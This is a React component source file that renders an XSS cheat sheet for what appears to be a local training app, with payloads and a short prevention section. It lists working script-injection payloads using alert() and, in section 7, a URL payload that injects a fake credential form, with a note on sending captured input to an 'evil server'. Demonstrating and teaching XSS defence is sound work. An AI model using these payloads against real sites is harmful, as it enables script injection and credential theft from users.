import { CopyToClipboardButton } from "../CopyToClipboardButton";

export function XssCheatSheet(){
    return <>
       <h1>XSS Cheat Sheet</h1>
    <p>
        Cross-Site Scripting (XSS) is a common web security vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users.
        This cheat sheet provides examples of various XSS payloads and vectors that can be used to demonstrate the vulnerability.
    </p>

    <h2>1. Basic XSS Payloads</h2>
    <p>These are simple examples of XSS attacks that execute JavaScript when the page is loaded:</p>
    <pre className="pre-container">
&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;<CopyToClipboardButton className="copy-button" toCopy="<script>alert('XSS Attack!');</script>"/>
    </pre>
    <pre className="pre-container">
&lt;img src="invalid-image" onerror="alert('XSS Attack!');" /&gt; <CopyToClipboardButton toCopy="&lt;img src='invalid-image' onerror='alert(&quot;XSS Attack!&quot;);' /&gt;" className="copy-button"/>
    </pre>

    <h2>2. XSS with Event Handlers</h2>
    <p>Event handlers in HTML elements can be exploited to execute JavaScript:</p>
    <pre>
&lt;a href="#" onclick="alert('XSS Attack!');"&gt;Click me!&lt;/a&gt;
    </pre>
    <pre>
&lt;div onmouseover="alert('XSS Attack!');"&gt;Hover over me!&lt;/div&gt;
    </pre>

    <h2>3. XSS with Image Tags</h2>
    <p>Image tags can be manipulated to trigger XSS when the image fails to load:</p>
    <pre>
&lt;img src="invalid" onerror="alert('XSS Attack!');" /&gt;
    </pre>

    <h2>4. XSS with Input Fields</h2>
    <p>Input fields that are not properly sanitized can also be a vector for XSS:</p>
    <pre>
&lt;input type="text" value="XSS" onfocus="alert('XSS Attack!');" /&gt;
    </pre>
    <pre>
&lt;textarea onblur="alert('XSS Attack!');"&gt;Type something...&lt;/textarea&gt;
    </pre>

    <h2>5. XSS with iframes</h2>
    <p>iframes can be used to load malicious content from external sources:</p>
    <pre>
&lt;iframe src="javascript:alert('XSS Attack!');"&gt;&lt;/iframe&gt;
    </pre>

    <h2>6. XSS in URL Parameters</h2>
    <p>Scripts can be embedded in URLs and executed if the application reflects the URL parameters unsafely:</p>
    <pre>
http://example.com/search?q=&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;
    </pre>

    <h2>7. XSS form payload in URL Parameters</h2>
    <p>This is similar to the 6. but more advanced. This xss payload is creates a form that can be used to send to someone(the url) and insert their credentials, with the submit the form will send to the hacker:</p>
    <pre>
    http://localhost:5173/xss?q=&lt;img src="not_available" onerror="(function createForm()&#123;const form = document.createElement('form'); const inputField = document.createElement('input'); inputField.type = 'text'; inputField.id = 'simpleInput'; inputField.name = 'simpleInput'; inputField.placeholder = 'Enter something...'; form.appendChild(inputField); const submitButton = document.createElement('button'); submitButton.type = 'submit'; submitButton.textContent = 'Submit'; form.appendChild(submitButton); document.getElementById('formContainer').appendChild(form);&#125;)()"&gt;
    </pre>


    <div className="note">
        <strong>Note:</strong> To modify the payload, we have to create a function that sends a fetch with the form to the "evil server", then insert the function into the form. This will imitate that the "victim" sends their credentials to the "attacker".
    </div>

    <h2>Preventing XSS</h2>
    <p>To prevent XSS attacks, consider the following best practices:</p>
    <ul>
        <li>Always escape special characters (like &lt;, &gt;, &amp;) before rendering user input.</li>
        <li>Use a library like DOMPurify to sanitize HTML before injecting it into the DOM.</li>
        <li>Use Content Security Policy (CSP) headers to restrict the sources from which scripts can be loaded.</li>
        <li>Avoid using <code>dangerouslySetInnerHTML</code> in React unless absolutely necessary.</li>
    </ul>

    </>
}